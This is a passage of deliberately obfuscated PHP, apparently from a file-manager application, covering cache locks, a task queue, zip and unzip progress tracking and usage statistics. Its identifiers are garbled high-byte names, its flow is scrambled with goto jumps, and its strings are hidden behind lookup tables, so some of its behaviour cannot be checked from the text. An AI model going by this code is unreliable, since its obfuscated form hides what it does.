$dŠìêÀ¿Çñ[181]; goto EÆ¹Ó˜¹…; EÆ¹Ó˜¹…: if ($AÒäÜŒñù‰ == $dŠìêÀ¿Çñ[17] && $bëè÷µ ù == $dŠìêÀ¿Çñ[9]) { $AÒäÜŒñù‰ = $dŠìêÀ¿Çñ[181]; } switch ($AÒäÜŒñù‰) { case $dŠìêÀ¿Çñ[770]: self::$handle = new CacheLockRedis(); break; case $dŠìêÀ¿Çñ[771]: self::$handle = new CacheLockMemcached(); break; case $dŠìêÀ¿Çñ[17]: self::$handle = new CacheLockDatabase(); break; case $dŠìêÀ¿Çñ[181]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto c˜ÄÏ¶‰÷ç; c˜ÄÏ¶‰÷ç: } private static function key($a°½Ä²Ò÷©) { return $_SERVER[¢Í][782] . Cache::key($a°½Ä²Ò÷©); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($cù“£³ĞÂ… = '') { self::$errorMsg = $cù“£³ĞÂ…; } public static function lockGlobal($bóº±®ÁÕ†, $eÊ–È—Ãœ) { return self::lock($bóº±®ÁÕ†, $eÊ–È—Ãœ, !0); } public static function lock($c…óÖŸ¨×Ã, $FÃƒ¢ŞŠï´ = false, $b·“¦Ÿ…Ø÷ = false) { goto bğ•ÀÀ¨¸ô; bğ•ÀÀ¨¸ô: $DÂ¦ìÎÂÔ =& $_SERVER[¢Í]; $bÌ“Î™ù™ç = self::init(); $AÕÕµ²Ò = self::key($c…óÖŸ¨×Ã); goto D‘ÁºÜœµ; D‘ÁºÜœµ: $FÃƒ¢ŞŠï´ = $FÃƒ¢ŞŠï´ ? $FÃƒ¢ŞŠï´ : self::$timeout; $b¨¬ğãá´÷ = $bÌ“Î™ù™ç->lock($AÕÕµ²Ò, $FÃƒ¢ŞŠï´); if (!$b¨¬ğãá´÷) { $e²×ÉˆìÌ× = "\154\157\x63\153\x20\x65\162\162\157\162\x3b\x6b\x65\171\x3d{$AÕÕµ²Ò}\73\x74\151\x6d\x65\75{$FÃƒ¢ŞŠï´}\x3b" . self::$errorMsg . $DÂ¦ìÎÂÔ[77] . get_caller_msg(); $d¾”‘¸¡½Ğ = LNG($DÂ¦ìÎÂÔ[783]) . "\x28{$FÃƒ¢ŞŠï´}\x73\x2c{$AÕÕµ²Ò}\x29\x21\12" . LNG($DÂ¦ìÎÂÔ[784]); $d¾”‘¸¡½Ğ .= $DÂ¦ìÎÂÔ[785]; if (is_string(self::$errorMsg) && self::$errorMsg) { $d¾”‘¸¡½Ğ = $d¾”‘¸¡½Ğ . $DÂ¦ìÎÂÔ[786] . self::$errorMsg; } write_log($e²×ÉˆìÌ×, $DÂ¦ìÎÂÔ[787]); show_json($d¾”‘¸¡½Ğ, !1); } goto D“ÑÎæó³Õ; D“ÑÎæó³Õ: if (!$b·“¦Ÿ…Ø÷) { self::$lockItem[$AÕÕµ²Ò] = !0; } return $b¨¬ğãá´÷; goto B™ğÏöØ; B™ğÏöØ: } public static function lockGet($B·Ä·¯İ) { $a„­‚„—æä = self::key($B·Ä·¯İ); if (self::$lockItem[$a„­‚„—æä]) { return self::$lockItem[$a„­‚„—æä]; } return self::init()->lockGet($a„­‚„—æä); } public static function unlock($BÔš©ÇàÅŠ) { $d¬œ£äĞ‰Õ = self::key($BÔš©ÇàÅŠ); self::$lockItem[$d¬œ£äĞ‰Õ] = null; return self::init()->unlock($d¬œ£äĞ‰Õ); } public static function unlockRuntime() { $e™–ˆğÉ…‚ =& $_SERVER[¢Í]; $B©‰Õ‘¿¡… = self::init(); $DË‰¶‡ŸÚ© = !1; foreach (self::$lockItem as $DÇ¸š»Ä… => $F—²ôğ…Ãù) { if (!$F—²ôğ…Ãù) { continue; } $B©‰Õ‘¿¡…->unlock($DÇ¸š»Ä…); if (!$DË‰¶‡ŸÚ©) { $DË‰¶‡ŸÚ© = !0; write_log($e™–ˆğÉ…‚[788] . $DÇ¸š»Ä… . $e™–ˆğÉ…‚[77] . get_caller_msg(), $e™–ˆğÉ…‚[787]); continue; } write_log($e™–ˆğÉ…‚[788] . $DÇ¸š»Ä…, $e™–ˆğÉ…‚[787]); } self::fileUnlockAll(); } public static function fileLock($C°ˆ’Àòó¦) { goto cœİœ¹¢‰; b¾Îóƒí»œ: $D„Ôğ²ìæ• = fopen(DATA_PATH . $C°ˆ’Àòó¦ . $A†ĞÔóâô’[790], $A†ĞÔóâô’[791]); if (!$D„Ôğ²ìæ•) { return !1; } $GLOBALS[$A†ĞÔóâô’[789]][$C°ˆ’Àòó¦] = $D„Ôğ²ìæ•; goto A·íŠœ›·; cœİœ¹¢‰: $A†ĞÔóâô’ =& $_SERVER[¢Í]; if (!$GLOBALS[$A†ĞÔóâô’[789]]) { $GLOBALS[$A†ĞÔóâô’[789]] = array(); } $GLOBALS[$A†ĞÔóâô’[789]][$C°ˆ’Àòó¦] = !1; goto b¾Îóƒí»œ; DÄçÀäšáĞ: return !1; goto E†¾Ôñì³; A·íŠœ›·: if (flock($D„Ôğ²ìæ•, LOCK_EX)) { return !0; } self::unlock($C°ˆ’Àòó¦); show_json($A†ĞÔóâô’[792], !1); goto DÄçÀäšáĞ; E†¾Ôñì³: } public static function fileUnlock($Fƒ‚©ê¨®ô) { $dÒé£ÀÒ² =& $_SERVER[¢Í]; $AËÆëÎÛõÚ = $GLOBALS[$dÒé£ÀÒ²[789]][$Fƒ‚©ê¨®ô]; if (!$AËÆëÎÛõÚ) { return; } $GLOBALS[$dÒé£ÀÒ²[789]][$Fƒ‚©ê¨®ô] = !1; flock($AËÆëÎÛõÚ, LOCK_UN); fclose($AËÆëÎÛõÚ); } public static function fileUnlockAll() { $aîÉ’ã—–¶ =& $_SERVER[¢Í]; if (!$GLOBALS[$aîÉ’ã—–¶[789]]) { return; } foreach ($GLOBALS[$aîÉ’ã—–¶[789]] as $Cº †ĞÃ§Õ => $CØÂš‡á“¡) { if (!$CØÂš‡á“¡) { continue; } $GLOBALS[$aîÉ’ã—–¶[789]][$Cº †ĞÃ§Õ] = !1; flock($CØÂš‡á“¡, LOCK_UN); fclose($CØÂš‡á“¡); } $GLOBALS[$aîÉ’ã—–¶[789]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto Dâàâ¼›Ì; B³É²èå‘”: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\x75\145\x75\145\114\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\x75\x65\x75\x65\x44\x61\164\141"; public static function initTask() { } public static function add($aÛ‹šÜ®»‘, $cóÖµÒ = array(), $cËğ”ŠÕÂŸ = '', $F”ÏöŠ× = '') { goto DöâƒÃŞå; DöâƒÃŞå: $fø¬ÒŠÈ„Ê =& $_SERVER[¢Í]; if (self::count() >= self::MAX_LENGTH) { return !1; } $BÉÙ¥¤‰Š¨ = self::getAll(); goto A¸ÎâƒÌ÷Ÿ; D­Ã£›¤Åè: self::setAll($BÉÙ¥¤‰Š¨); return !0; goto c‘‰ªğÅİ; A¸ÎâƒÌ÷Ÿ: if ($F”ÏöŠ× && array_find_by_field($BÉÙ¥¤‰Š¨, $fø¬ÒŠÈ„Ê[99], $F”ÏöŠ×)) { return !0; } $BÉÙ¥¤‰Š¨[] = array($fø¬ÒŠÈ„Ê[267] => $aÛ‹šÜ®»‘, $fø¬ÒŠÈ„Ê[1560] => $cóÖµÒ, $fø¬ÒŠÈ„Ê[430] => $cËğ”ŠÕÂŸ, $fø¬ÒŠÈ„Ê[99] => $F”ÏöŠ×); write_log($fø¬ÒŠÈ„Ê[1561] . $cËğ”ŠÕÂŸ, $fø¬ÒŠÈ„Ê[1562]); goto D­Ã£›¤Åè; c‘‰ªğÅİ: } public static function run() { goto C¢Ø‘àÀ; bË¬ÁÈİéÍ: if (!$Aõ¯„Æë£) { return !1; } self::setAll($A»Ü‡Îã¡ø); write_log($aêÇƒë½Ü¶[1563] . $Aõ¯„Æë£[$aêÇƒë½Ü¶[430]], $aêÇƒë½Ü¶[1562]); goto D¦Ëƒ—–ñ; C¢Ø‘àÀ: $aêÇƒë½Ü¶ =& $_SERVER[¢Í]; $A»Ü‡Îã¡ø = self::getAll(); $Aõ¯„Æë£ = array_shift($A»Ü‡Îã¡ø); goto bË¬ÁÈİéÍ; D¦Ëƒ—–ñ: try { $B´§Ÿ†³Ë¡ = Hook::apply($Aõ¯„Æë£[$aêÇƒë½Ü¶[267]], $Aõ¯„Æë£[$aêÇƒë½Ü¶[1560]]); } catch (Exception $BÓ…Ì¿¶“) { } write_log($aêÇƒë½Ü¶[1564] . $Aõ¯„Æë£[$aêÇƒë½Ü¶[430]], $aêÇƒë½Ü¶[1562]); return !0; goto B§Ûöèğ¶”; B§Ûöèğ¶”: } public static function count() { $Eæ¢áù®Ñ¾ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Eæ¢áù®Ñ¾) { return 0; } return intval($Eæ¢áù®Ñ¾); } public static function getAll() { $F•‹Ç…ù•· = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$F•‹Ç…ù•·) { return array(); } return $F•‹Ç…ù•·; } public static function setAll($bĞÀ¼È¥ÔŒ) { $eºÃ•ºùó† = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($bĞÀ¼È¥ÔŒ), $eºÃ•ºùó†); Cache::set(self::QUEUE_DATA, $bĞÀ¼È¥ÔŒ, $eºÃ•ºùó†); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Bàâàå†õõ; bàĞÖÃ´­: if (!$c®¹ÛÚù›š[$EÚçÌÊÆÁÏ[1394]]) { $c®¹ÛÚù›š[$EÚçÌÊÆÁÏ[1394]] = LNG($EÚçÌÊÆÁÏ[1569]); } goto dË ª²¤§; a¤äµ´Ú™ª: Hook::bind($EÚçÌÊÆÁÏ[1056], array($this, $EÚçÌÊÆÁÏ[1567])); $c®¹ÛÚù›š =& $this->task; $c®¹ÛÚù›š[$EÚçÌÊÆÁÏ[1568]] = $EÚçÌÊÆÁÏ[1061]; goto bàĞÖÃ´­; Bàâàå†õõ: $EÚçÌÊÆÁÏ =& $_SERVER[¢Í]; parent::startAfter(); Hook::bind($EÚçÌÊÆÁÏ[1565], array($this, $EÚçÌÊÆÁÏ[1566])); goto a¤äµ´Ú™ª; dË ª²¤§: } protected function endAfter() { $bÜù“š´ =& $_SERVER[¢Í]; parent::endAfter(); Hook::unbind($bÜù“š´[1565], array($this, $bÜù“š´[1566])); Hook::unbind($bÜù“š´[1056], array($this, $bÜù“š´[1567])); } public function updateAfter() { $E¥ÀÒê¿ª¦ =& $_SERVER[¢Í]; $bµÎİÅÆ– =& $this->task; if (!$bµÎİÅÆ–[$E¥ÀÒê¿ª¦[989]] || !$bµÎİÅÆ–[$E¥ÀÒê¿ª¦[712]]) { return; } if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1568]] == $E¥ÀÒê¿ª¦[1061]) { $a‰Ùñ»¼Í = 0; if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1534]]) { $a‰Ùñ»¼Í = $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1535]] / $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1534]]; } $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]] = $a‰Ùñ»¼Í * 0.3; } else { if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1568]] == $E¥ÀÒê¿ª¦[316]) { $a‰Ùñ»¼Í = $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1003]] / $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[989]]; $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]] = 0.3 + $a‰Ùñ»¼Í * 0.4; } else { if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1568]] == $E¥ÀÒê¿ª¦[113]) { $fÁªŸŒŠäÀ = 0; if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1536]] == $E¥ÀÒê¿ª¦[113]) { $fÁªŸŒŠäÀ = $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1535]]; } $a‰Ùñ»¼Í = ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1539]] + $fÁªŸŒŠäÀ) / $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[712]]; $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]] = 0.3 + 0.4 + $a‰Ùñ»¼Í * 0.3; } } } if ($bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]] > 0) { $f½ˆ¦ö‚˜Ô = timeFloat() - $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1492]] - $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1495]]; $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1496]] = $f½ˆ¦ö‚˜Ô * (1 - $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]]) / $bµÎİÅÆ–[$E¥ÀÒê¿ª¦[1490]]; } } public function addFile($d‰šÚÚ¡‹‚) { goto BË½„±§…•; Fº›©®Œ¹õ: $E°ª”ëÂ™[$EÃÔÅğè[991]] = $EÃÔÅğè[1551]; $E°ª”ëÂ™[$EÃÔÅğè[1536]] = $EÃÔÅğè[1061]; $E°ª”ëÂ™[$EÃÔÅğè[712]] = $FéƒŸÒÆõ[$EÃÔÅğè[87]]; goto dÜó ëËôİ; dÜó ëËôİ: $E°ª”ëÂ™[$EÃÔÅğè[989]] = 1; $dÒ³àÂë‚Ä = 0; $E°ª”ëÂ™[$EÃÔÅğè[1543]] = array($EÃÔÅğè[1544] => $dÒ³àÂë‚Ä + 1, $EÃÔÅğè[411] => $FéƒŸÒÆõ[$EÃÔÅğè[28]], $EÃÔÅğè[85] => $FéƒŸÒÆõ[$EÃÔÅğè[85]], $EÃÔÅğè[492] => $FéƒŸÒÆõ[$EÃÔÅğè[492]] ? $FéƒŸÒÆõ[$EÃÔÅğè[492]] : $FéƒŸÒÆõ[$EÃÔÅğè[85]]); goto fî¸èãÎ÷·; D­»³¼õèù: $E°ª”ëÂ™[$EÃÔÅğè[1532]] = $FéƒŸÒÆõ[$EÃÔÅğè[28]]; $E°ª”ëÂ™[$EÃÔÅğè[1534]] = $FéƒŸÒÆõ[$EÃÔÅğè[87]]; $E°ª”ëÂ™[$EÃÔÅğè[1535]] = 0; goto Fº›©®Œ¹õ; fî¸èãÎ÷·: $this->update(); goto bÎ‚°¶°¶ˆ; BË½„±§…•: $EÃÔÅğè =& $_SERVER[¢Í]; $E°ª”ëÂ™ =& $this->task; $FéƒŸÒÆõ = IO::info($d‰šÚÚ¡‹‚); goto D­»³¼õèù; bÎ‚°¶°¶ˆ: } public function unzipAfter($d‘ÂáŞà) { goto aåÉÚÛÚš; bæƒÌŠÍØ‡: if ($bäÌ¾‘“›³[$fàÏÙØ˜Àµ[29]] == $fàÏÙØ˜Àµ[181]) { $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[989]] = 1; } else { $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[989]] = $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[90]][$fàÏÙØ˜Àµ[88]]; } $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[991]] = $fàÏÙØ˜Àµ[33]; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1536]] = 0; goto B”¨Š±“¦×; e¾ó ´¥õ–: $bäÌ¾‘“›³ = IO::infoWithChildren($d‘ÂáŞà); $aìñÂ±Éö‰ = 0; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1543]] = array($fàÏÙØ˜Àµ[1544] => $aìñÂ±Éö‰ + 1, $fàÏÙØ˜Àµ[411] => $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[28]], $fàÏÙØ˜Àµ[85] => $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[85]], $fàÏÙØ˜Àµ[492] => $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[492]] ? $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[492]] : $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[85]]); goto bæƒÌŠÍØ‡; aåÉÚÛÚš: $fàÏÙØ˜Àµ =& $_SERVER[¢Í]; $bíŒ§Á’éƒ =& $this->task; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1568]] = $fàÏÙØ˜Àµ[113]; goto e¾ó ´¥õ–; B”¨Š±“¦×: $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1003]] = 0; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1534]] = 0; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1535]] = 0; goto b°£Ş˜á³; AŸƒ³ÃùèØ: $this->update(); self::log($fàÏÙØ˜Àµ[1570] . json_encode(array($bíŒ§Á’éƒ, $bäÌ¾‘“›³))); goto D–ö©Š¶Œ; b°£Ş˜á³: $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1532]] = $fàÏÙØ˜Àµ[33]; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[1539]] = 0; $bíŒ§Á’éƒ[$fàÏÙØ˜Àµ[712]] = $bäÌ¾‘“›³[$fàÏÙØ˜Àµ[87]]; goto AŸƒ³ÃùèØ; D–ö©Š¶Œ: } public function nameParse($bÃ¾ªØÉï£) { goto DÓÓ‘…ÉëÈ; DÓÓ‘…ÉëÈ: $FÕÕ°ªÂó =& $_SERVER[¢Í]; $F£ùÅ‰‚÷Œ =& $this->task; if ($F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[1568]] == $FÕÕ°ªÂó[1061]) { $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[1568]] = $FÕÕ°ªÂó[316]; $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[1539]] = 0; $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[712]] = 0; } goto BõøŸ·ºÛ; CãÙ—¸¢ˆ’: $this->update(); goto Bƒ‘¨‚ùÚ; BõøŸ·ºÛ: $b§¬¿Ü ˜æ = get_path_this($bÃ¾ªØÉï£); if (strstr($b§¬¿Ü ˜æ, $FÕÕ°ªÂó[101])) { $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[1003]] += 1; $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[989]] += 1; } $F£ùÅ‰‚÷Œ[$FÕÕ°ªÂó[1532]] = $bÃ¾ªØÉï£; goto CãÙ—¸¢ˆ’; Bƒ‘¨‚ùÚ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $FÛŒí¥ÎÑô =& $_SERVER[¢Í]; parent::startAfter(); Hook::bind($FÛŒí¥ÎÑô[1571], array($this, $FÛŒí¥ÎÑô[1566])); $eìò±ÉÉİÖ =& $this->task; $eìò±ÉÉİÖ[$FÛŒí¥ÎÑô[1568]] = $FÛŒí¥ÎÑô[1061]; if (!$eìò±ÉÉİÖ[$FÛŒí¥ÎÑô[1394]]) { $eìò±ÉÉİÖ[$FÛŒí¥ÎÑô[1394]] = LNG($FÛŒí¥ÎÑô[1572]); } } protected function endAfter() { $AĞ³Ö§½¶¡ =& $_SERVER[¢Í]; parent::endAfter(); Hook::unbind($AĞ³Ö§½¶¡[1571], array($this, $AĞ³Ö§½¶¡[1566])); } public function updateAfter() { $CÆŠ‰½•¾ =& $_SERVER[¢Í]; $a‰àæœé½‚ =& $this->task; if (!$a‰àæœé½‚[$CÆŠ‰½•¾[989]] || !$a‰àæœé½‚[$CÆŠ‰½•¾[712]]) { return; } if ($a‰àæœé½‚[$CÆŠ‰½•¾[1568]] == $CÆŠ‰½•¾[1061]) { $F¨×˜ºí«Ô = $a‰àæœé½‚[$CÆŠ‰½•¾[1535]]; if ($a‰àæœé½‚[$CÆŠ‰½•¾[1536]] != $CÆŠ‰½•¾[1061]) { $F¨×˜ºí«Ô = 0; } $E¼ŒˆÚõçè = ($a‰àæœé½‚[$CÆŠ‰½•¾[1539]] + $F¨×˜ºí«Ô) / $a‰àæœé½‚[$CÆŠ‰½•¾[712]]; $a‰àæœé½‚[$CÆŠ‰½•¾[1490]] = $E¼ŒˆÚõçè * 0.3; } else { if ($a‰àæœé½‚[$CÆŠ‰½•¾[1568]] == $CÆŠ‰½•¾[316]) { $E¼ŒˆÚõçè = $a‰àæœé½‚[$CÆŠ‰½•¾[1003]] / $a‰àæœé½‚[$CÆŠ‰½•¾[989]]; $a‰àæœé½‚[$CÆŠ‰½•¾[1490]] = 0.3 + $E¼ŒˆÚõçè * 0.5; } else { if ($a‰àæœé½‚[$CÆŠ‰½•¾[1568]] == $CÆŠ‰½•¾[113]) { $E¼ŒˆÚõçè = 0; if ($a‰àæœé½‚[$CÆŠ‰½•¾[1534]]) { $E¼ŒˆÚõçè = $a‰àæœé½‚[$CÆŠ‰½•¾[1535]] / $a‰àæœé½‚[$CÆŠ‰½•¾[1534]]; } $a‰àæœé½‚[$CÆŠ‰½•¾[1490]] = 0.3 + 0.5 + $E¼ŒˆÚõçè * 0.2; } } } if ($a‰àæœé½‚[$CÆŠ‰½•¾[1490]] > 0) { $E™†Ò÷Œñ° = timeFloat() - $a‰àæœé½‚[$CÆŠ‰½•¾[1492]] - $a‰àæœé½‚[$CÆŠ‰½•¾[1495]]; $a‰àæœé½‚[$CÆŠ‰½•¾[1496]] = $E™†Ò÷Œñ° * (1 - $a‰àæœé½‚[$CÆŠ‰½•¾[1490]]) / $a‰àæœé½‚[$CÆŠ‰½•¾[1490]]; } } public function copyFileStart($Dòæ‹–ìÌ, $FÙù‘óê”Ñ, $Eïë¢ç², $e‚Ã¹·éŞ¡, $e‚´©çí¨Ô, $B¦„ï¡¦ ³) { $dù¼Ó»®¹¼ =& $_SERVER[¢Í]; parent::copyFileStart($Dòæ‹–ìÌ, $FÙù‘óê”Ñ, $Eïë¢ç², $e‚Ã¹·éŞ¡, $e‚´©çí¨Ô, $B¦„ï¡¦ ³); $C’ºï÷×èÆ =& $this->task; if ($C’ºï÷×èÆ[$dù¼Ó»®¹¼[1568]] == $dù¼Ó»®¹¼[316]) { $C’ºï÷×èÆ[$dù¼Ó»®¹¼[1568]] = $dù¼Ó»®¹¼[113]; } $this->update(); } public function copyFileEnd($fœ¥Ò¸ºÅ…, $A°šÕ„ĞÍ, $e¸ŸÆÂ‹õ, $F†™Œ± É‰, $b¬Â“¶ˆ¼‚, $D±®ŠµµÄ) { $Aà¿ê—èÑ =& $_SERVER[¢Í]; $e¶à´ƒóÊœ =& $this->task; $e¶à´ƒóÊœ[$Aà¿ê—èÑ[1535]] = $e¶à´ƒóÊœ[$Aà¿ê—èÑ[1534]]; $e¶à´ƒóÊœ[$Aà¿ê—èÑ[1539]] += $e¶à´ƒóÊœ[$Aà¿ê—èÑ[1534]]; $e¶à´ƒóÊœ[$Aà¿ê—èÑ[1536]] = $Aà¿ê—èÑ[33]; $this->update(); } public function nameParse($Eæà¸••·) { $fŒÆœ‚Ä“Š =& $_SERVER[¢Í]; $AÔØŠ¬ñ†ã =& $this->task; if ($AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[1003]] < $AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[989]]) { $B‰•‘©Âğ¥ = get_path_this($Eæà¸••·); if (strstr($B‰•‘©Âğ¥, $fŒÆœ‚Ä“Š[101])) { $AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[1003]] += 1; } } if ($AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[1568]] == $fŒÆœ‚Ä“Š[1061]) { $AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[1568]] = $fŒÆœ‚Ä“Š[316]; } $AÔØŠ¬ñ†ã[$fŒÆœ‚Ä“Š[1532]] = $Eæà¸••·; $this->update(); } } goto CĞîß¹…½ƒ; CĞîß¹…½ƒ: class AnalysisModel extends ModelBaseLight { public function init($bÀñ÷ß¯ÉÃ) { $C‰²×ùÒÔ =& $_SERVER[¢Í]; $eÒ÷Ÿöí§ˆ = array($C‰²×ùÒÔ[560] => array($C‰²×ùÒÔ[29] => $C‰²×ùÒÔ[1573], $C‰²×ùÒÔ[276] => array($C‰²×ùÒÔ[228], $C‰²×ùÒÔ[714], $C‰²×ùÒÔ[1574], $C‰²×ùÒÔ[1575])), $C‰²×ùÒÔ[1576] => array($C‰²×ùÒÔ[29] => $C‰²×ùÒÔ[1577], $C‰²×ùÒÔ[276] => array($C‰²×ùÒÔ[228], $C‰²×ùÒÔ[712], $C‰²×ùÒÔ[1578], $C‰²×ùÒÔ[1579], $C‰²×ùÒÔ[1580]))); if (!isset($eÒ÷Ÿöí§ˆ[$bÀñ÷ß¯ÉÃ])) { return !1; } $this->optionType = $eÒ÷Ÿöí§ˆ[$bÀñ÷ß¯ÉÃ][$C‰²×ùÒÔ[29]]; $this->field = $eÒ÷Ÿöí§ˆ[$bÀñ÷ß¯ÉÃ][$C‰²×ùÒÔ[276]]; return !0; } public function listData($B­Õµ‹×’ = false, $A§ÛÕÂ†½™ = "\x6d\x6f\x64\x69\x66\x79\124\x69\x6d\145", $d¶ºˆµò­ = false) { return parent::listData($B­Õµ‹×’, $A§ÛÕÂ†½™, $d¶ºˆµò­); } public function trendList($bµ…õ ´™±) { goto E÷ÃÒ¹æŸ¹; E÷ÃÒ¹æŸ¹: $C”õó×Ï· =& $_SERVER[¢Í]; $Bá¶µô”¹ = $this->listData(); if ($Bá¶µô”¹) { $EôòÕ¶õÜ‡ = end($Bá¶µô”¹); $E‡Éá«á = date($C”õó×Ï·[1581], strtotime($C”õó×Ï·[1582])); if ($EôòÕ¶õÜ‡[$C”õó×Ï·[228]] == $E‡Éá«á) { return $Bá¶µô”¹; } $dÉµôÏğ‚ñ = strtotime($EôòÕ¶õÜ‡[$C”õó×Ï·[228]]); } goto BÚÆŞÍŒó§; bëÛÜ‡ÑÍó: foreach ($cÕÍïÛì…ä as $E‡Éá«á) { $this->{$BÅâ³ïÒœ}($E‡Éá«á); } return $this->listData(); goto AíßîƒÁˆá; BÚÆŞÍŒó§: if (!isset($dÉµôÏğ‚ñ)) { $FÚãÎâ»±¼ = $bµ…õ ´™± == $C”õó×Ï·[560] ? $C”õó×Ï·[503] : $C”õó×Ï·[765]; $dÉµôÏğ‚ñ = Model($FÚãÎâ»±¼)->min($C”õó×Ï·[200]); } $BÅâ³ïÒœ = $C”õó×Ï·[1583] . ucfirst($bµ…õ ´™±); $cÕÍïÛì…ä = $this->dateList($dÉµôÏğ‚ñ); goto bëÛÜ‡ÑÍó; AíßîƒÁˆá: } private function dateList($D¿äĞ’¡›®) { $d‰‹Öò›Â =& $_SERVER[¢Í]; $eí“õÛ¨Œ = $D¿äĞ’¡›®; $F’¬æá•äÀ = strtotime($d‰‹Öò›Â[1582]); $BÔì¤¶Ö« = array(); while ($eí“õÛ¨Œ <= $F’¬æá•äÀ) { $BÔì¤¶Ö«[] = date($d‰‹Öò›Â[1581], $eí“õÛ¨Œ); $eí“õÛ¨Œ = strtotime($d‰‹Öò›Â[1584], $eí“õÛ¨Œ); } return $BÔì¤¶Ö«; } public function _recordUser($cÙæÂ¢Ó¼á = '') { goto b©³ó›‘İÇ; a½ôÒä¥Ğ: $B§ë×»‹Ğ— = Model($D«Ç¬Ñ¸Ğµ[503])->where($b±»«ÈÜ©)->count($D«Ç¬Ñ¸Ğµ[1489]); $b±»«ÈÜ©[$D«Ç¬Ñ¸Ğµ[29]] = $D«Ç¬Ñ¸Ğµ[1587]; $e‹öÃÑÊßÃ = Model($D«Ç¬Ñ¸Ğµ[1588])->where($b±»«ÈÜ©)->count($D«Ç¬Ñ¸Ğµ[1589]); goto Fõ¥ñ¹½µ×; e‹Æ¼†¡§º: $b±»«ÈÜ© = array($D«Ç¬Ñ¸Ğµ[200] => array($D«Ç¬Ñ¸Ğµ[938], $dìì²¨ğâÍ)); $bëÁãˆÒ•¿ = Model($D«Ç¬Ñ¸Ğµ[503])->where($b±»«ÈÜ©)->count($D«Ç¬Ñ¸Ğµ[1489]); $b±»«ÈÜ©[$D«Ç¬Ñ¸Ğµ[200]] = array($D«Ç¬Ñ¸Ğµ[336], array($B£ÑÊ´¨É—, $dìì²¨ğâÍ)); goto a½ôÒä¥Ğ; b©³ó›‘İÇ: $D«Ç¬Ñ¸Ğµ =& $_SERVER[¢Í]; $B£ÑÊ´¨É— = strtotime(date($D«Ç¬Ñ¸Ğµ[1585], strtotime($cÙæÂ¢Ó¼á))); $dìì²¨ğâÍ = strtotime(date($D«Ç¬Ñ¸Ğµ[1586], strtotime($cÙæÂ¢Ó¼á))); goto e‹Æ¼†¡§º; Fõ¥ñ¹½µ×: $e„‰‹…˜ Í = array($D«Ç¬Ñ¸Ğµ[228] => $cÙæÂ¢Ó¼á, $D«Ç¬Ñ¸Ğµ[714] => (int) $bëÁãˆÒ•¿, $D«Ç¬Ñ¸Ğµ[1574] => (int) $B§ë×»‹Ğ—, $D«Ç¬Ñ¸Ğµ[1575] => (int) $e‹öÃÑÊßÃ); return $this->insert($e„‰‹…˜ Í); goto AŒÈ­ËØ–º; AŒÈ­ËØ–º: } public function _recordStore($BĞŠËô¦«¬ = '') { goto A»”•ğÊ›Å; A»”•ğÊ›Å: $d”‡Ê‰¤‚è =& $_SERVER[¢Í]; $B¨°°†í”â = strtotime(date($d”‡Ê‰¤‚è[1586], strtotime($BĞŠËô¦«¬))); $EÍ…¯öÁÊ« = array($d”‡Ê‰¤‚è[200] => array($d”‡Ê‰¤‚è[938], $B¨°°†í”â)); goto DöôïÀêª‚; 